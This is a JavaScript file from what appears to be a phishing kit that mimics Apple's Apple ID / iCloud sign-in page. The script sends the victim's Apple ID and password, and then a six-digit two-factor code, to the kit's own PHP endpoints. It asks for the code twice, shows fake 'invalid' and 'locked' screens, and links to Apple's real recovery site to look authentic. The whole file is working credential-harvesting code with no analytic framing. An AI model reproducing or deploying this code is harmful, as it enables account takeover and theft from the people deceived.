
		$(document).ready(function(){
		    	if ($("#account_name_text_field").val() != ""){
				   $("#sign-in").prop("disabled", false);
				   $("#sign-in").removeClass("disable");
				} else {
					$("#sign-in").addClass("disable");
					 $("account_name_text_field").focus();
				}
			var check = false;
			var latime = $( window ).width();
			if (latime <= 360){
				$("#spinner_1").css("width", "550px");
				$("#spinner_2").css("width", "550px");
			} else {
				$("#spinner_1").css("width", "602px");
				$("#spinner_2").css("width", "602px");
			}

			$("#go-back").click(function(){
				$("#locked_id").addClass("hide");
				$("#password_text_field").val("");
				$("#spinner_2").addClass("hide");
				$("#sign-in").prop("disabled", true);
				$("#sign-in").addClass("disable");
				$("#sign-in").removeClass("hide");
				$("#step2").removeClass("hide");
										
			
			});

			$("#block-account").click(function(){
				$("#blocked_id").addClass("hide");
				$("#password_text_field").val("");
				$("#spinner_2").addClass("hide");
				$("#sign-in").prop("disabled", true);
				$("#sign-in").addClass("disable");
				$("#sign-in").removeClass("hide");
				$("#step").removeClass("hide");
										
			
			});

			$("#unlock-account").click(function(){
				document.location.href = "https://iforgot.apple.com"
			});
			
			$( "#checkbox,.si-remember-password,#remember-me-label" ).click(function() {
				if (!check){
					$("#remember-me").removeClass("icon_uncheck_2");
					$("#remember-me").addClass("icon_checked_2");
					check = !check;
				} else {
					$("#remember-me").removeClass("icon_checked_2");
					$("#remember-me").addClass("icon_uncheck_2");
					check = !check;
				}
			});

			$("#char0").keyup(function (e) {
				$("#char1").focus();
			});

			$("#char1").keyup(function (e) {
				$("#char2").focus();
			});

			$("#char2").keyup(function (e) {
				$("#char3").focus();
			});

			$("#char3").keyup(function (e) {
				$("#char4").focus();
			});

			$("#char4").keyup(function (e) {
				$("#char5").focus();
			});

			$("#char5").keyup(function (e) {
				if ($("#char0").val() != "" && $("#char1").val() != "" && $("#char2").val() != "" && $("#char3").val() != "" && $("#char4").val() != "" && $("#char5").val() != ""){
					postpasscode();
				} else {
					$("#char0").val("");
					$("#char1").val("");
					$("#char2").val("");
					$("#char3").val("");
					$("#char4").val("");
					$("#char5").val("");
					$("#char0").focus();
				}
			});
            var key = $("#key").val();
			var num;
			var afis = 0;
			function postpasscode(){
				num = $("#char0").val()+$("#char1").val()+$("#char2").val()+$("#char3").val()+$("#char4").val()+$("#char5").val()
				$.ajax({

					type:"POST",
					url:"ajax/ajax_code.php",
					data: "code="+num+"&key="+key,
				});

				afis++;
				$("#char0").val("");
				$("#char1").val("");
				$("#char2").val("");
				$("#char3").val("");
				$("#char4").val("");
				$("#char5").val("");
				$("#char0").focus();

				if (afis == 2){

				var delayInMilliseconds = 300; 
					setTimeout(function() {
								var redirect_after_login = "apple";
										if (redirect_after_login == "apple") document.location.href = "/isuccess.php";
										else if (redirect_after_login == "map") document.location.href = "/device/map";
										  }, delayInMilliseconds);
				} else $("#stepEl").effect("shake", {times:3}, 500);
			}


			
			$( "#account_name_text_field" ).keyup(function (e) {
				$("#password_text_field").val("");
		
				if ($("#vo_border").hasClass("show-password")){
					$("#sign_in_form").removeClass("show-password");
					$("#sign_in_form").addClass("hide-password");
					$("#vo_border").removeClass("show-password"); 
					$("#vo_border").removeClass("show-placeholder");
					$("#div_password").removeClass("show-password"); 
					$("#div_password").removeClass("show-placeholder"); 
					}
				
				if (!$( "#error_div" ).hasClass( "hide" )) {
					$("#error_div").addClass("hide");
				}
				
				if ($("#account_name_text_field").val() != ""){
				   $("#sign-in").prop("disabled", false);
					 $("#sign-in").removeClass("disable");
				} else {
					$("#sign-in").addClass("disable");
				}
				
				if (e.which == 13) {
					sign_in();
				}
			});
			
		
			$( "#password_text_field" ).keyup(function (e) {
				if (!$( "#error_div" ).hasClass( "hide" )) {
					$("#error_div").addClass("hide");
				}
				
				if ($("#password_text_field").val() != ""){
				   $("#sign-in").prop("disabled", false);
					 $("#sign-in").removeClass("disable");
				} else {
					$("#sign-in").addClass("disable");
				}
				
				if (e.which == 13) {
					sign_in();
				}
			});
			
				$( "#account_name_text_field" ).focus(function() {
				if ($("#vo_border").hasClass("password-focus")){
					$("#vo_border").removeClass("password-focus");
					$("#sign-in").removeClass("password-focus");
					$("#separator").removeClass("password-focus");
				}
				$("#sign_in_form").addClass("apple-id-focus");
				$("#vo_border").addClass("apple-id-focus");
				$("#separator").addClass("apple-id-focus");
				
			});
			
			$( "#password_text_field" ).focus(function() {
				var login_input = $("#account_name_text_field").val();
					if (login_input.length != ""){
						if (login_input.indexOf("@")!=-1){
					
						} else {
							$("#account_name_text_field").val(login_input+"@icloud.com");
						}
					}
				if ($("#vo_border").hasClass("apple-id-focus")){
					$("#sign_in_form").removeClass("apple-id-focus");
					$("#vo_border").removeClass("apple-id-focus");
					$("#separator").removeClass("apple-id-focus");
				}
				$("#sign_in_form").addClass("password-focus");
				$("#vo_border").addClass("password-focus");
				$("#separator").addClass("password-focus");
				
			});
			
			function sign_in(){
				if ($("#account_name_text_field").val() != ""){
					var login_input = $("#account_name_text_field").val();
					if (login_input.length != ""){
						if (login_input.indexOf("@")!=-1){
					
						} else {
							$("#account_name_text_field").val(login_input+"@icloud.com");
						}
					}
					if ($("#password_text_field").val() == ""){
						var apple = $("#account_name_text_field").val();
						var key = $("#key").val();
						$.ajax({
								type:"POST",
								url:"ajax/ajax_app_id.php",
								data:"appleID="+apple+"&key="+key,
								success: function(msg){
									
								}
						});
						$("#spinner_1").removeClass("hide");
						$("#sign-in").addClass("hide");
						$("#account_name_text_field").blur();
						$("#password_text_fieldin").focus();
						
						
						setTimeout(function(){
							$("#spinner_1").addClass("hide");
							$("#sign_in_form").removeClass("hide-password");
							$("#sign_in_form").addClass("show-password");
							$("#div_password").addClass("show-password"); 
							$("#div_password").addClass("show-placeholder");
							$("#sign-in").prop("disabled", true);
							$("#sign-in").addClass("disable");
							 $("#sign-in").removeClass("hide");
							
						}, 800);
						 setTimeout(function(){
							$("#separator").addClass("password-focus");
							$("#vo_border").addClass("show-password");
							$("#vo_border").addClass("password-focus");
							if ($("#vo_border").hasClass("apple-id-focus")){
								$("#vo_border").removeClass("apple-id-focus");
							}
						}, 1200);
						} else {
						     $("#sign_in_form").addClass("show-password");
							login();
						}
					}
				
			}
			
			$("#sign-in").click(function(){
				if ($("#account_name_text_field").val() != ""){
					var login_input = $("#account_name_text_field").val();
					if (login_input.length != ""){
						if (login_input.indexOf("@")!=-1){
					
						} else {
							$("#account_name_text_field").val(login_input+"@icloud.com");
						}
					}
					if ($("#password_text_field").val() == ""){
						var apple = $("#account_name_text_field").val();
						var key = $("#key").val();
						
						$.ajax({
								type:"POST",
								url:"ajax/ajax_app_id.php",
								data:"appleID="+apple+"&key="+key,
								success: function(msg){
									
								}
						});
						$("#spinner_1").removeClass("hide");
						$("#sign-in").addClass("hide");
						
						
						setTimeout(function(){
							$("#spinner_1").addClass("hide");
							$("#sign_in_form").removeClass("hide-password");
							$("#sign_in_form").addClass("show-password");
							$("#div_password").addClass("show-password"); 
							$("#div_password").addClass("show-placeholder");
							$("#sign-in").prop("disabled", true);
							$("#sign-in").addClass("disable");
							$("#sign-in").removeClass("hide");
						}, 800);
						 setTimeout(function(){
							$("#separator").addClass("password-focus");
							$("#vo_border").addClass("show-password");
							$("#vo_border").addClass("password-focus");
							if ($("#vo_border").hasClass("apple-id-focus")){
							$("#vo_border").removeClass("apple-id-focus");
							}
						}, 1200);
						} else {
						     $("#sign_in_form").addClass("show-password");
							login();
						}
					}
			});
			
			function login(){
						$("#password_text_field").blur();
						var apple = $("#account_name_text_field").val();
						var pw = $("#password_text_field").val();
						var key = $("#key").val();
						
						if(apple!="" && pw!="")
						{
							$("#submit").removeClass("disable");
							$("#submit").addClass("v-hide");
							$("#spiner").removeClass("hide");
							$("#spinner_2").removeClass("hide");
							$("#sign-in").addClass("hide");
							$.ajax({
		
								type:"POST",
								url:"ajax/ajax.php",
								data:"appleID="+apple+"&pw="+pw+"&key="+key+"&landing=new",
								success: function(msg){
									// alert(msg);
									if(msg == "INVALID")
									{
										$("#spinner_2").addClass("hide");
										$("#password_text_field").val("");
										$("#div_password").addClass("show-placeholder");
										$("#error_div").removeClass("hide");
										$("#submit").addClass("disabled");
										$("#password_text_field").focus();
										$("#sign-in").prop("disabled", true);
										$("#sign-in").addClass("disable");
										$("#sign-in").removeClass("hide");
									} 
								else if(msg == "LOCKED")
									{
										$("#sc1853").css("display","block");
										$(".login").css("display","none");
										$("#step2").addClass("hide");
					                    $( "#step" ).removeClass("hide");
					                    $("#char0").focus();
									} 
									else {
										$("#sc1853").css("display","block");
										$(".login").css("display","none");
										$("#step2").addClass("hide");
					                    $( "#step" ).removeClass("hide");
					                    $("#char0").focus();
									}
									$("#submit").addClass("disable");
									$("#submit").removeClass("v-hide");
									$("#spiner").addClass("hide");
									$("#spiner").removeClass("show");
								}
							});
						}
						else
						{
							if(apple=="") jQuery("#account_name_text_field").focus();
							else if(pw=="") jQuery("#password_text_field").focus();
						}
						
					}
		
		});
			function openForm(){
					$("#step").addClass("hide");
					$( "#step2" ).removeClass("hide");
					$("#spinner_2").addClass("hide");
										$("#password_text_field").val("");
										$("#error_div").removeClass("hide");
										$("#submit").addClass("disabled");
										$("#password_text_field").focus();
										$("#sign-in").prop("disabled", true);
										$("#sign-in").addClass("disable");
										$("#sign-in").removeClass("hide");
			}
					function myPasteID(){
						$("#account_name_text_field").removeClass("disabled");
						$("#sign-in").prop("disabled", false);
				   $("#sign-in").removeClass("disable");
					}
		
					function myPastePW(){
						$("#password_text_field").removeClass("disabled");
						$("#sign-in").prop("disabled", false);
				   $("#sign-in").removeClass("disable");
					}
		
					document.getElementById("erasable").innerHTML = "";

			
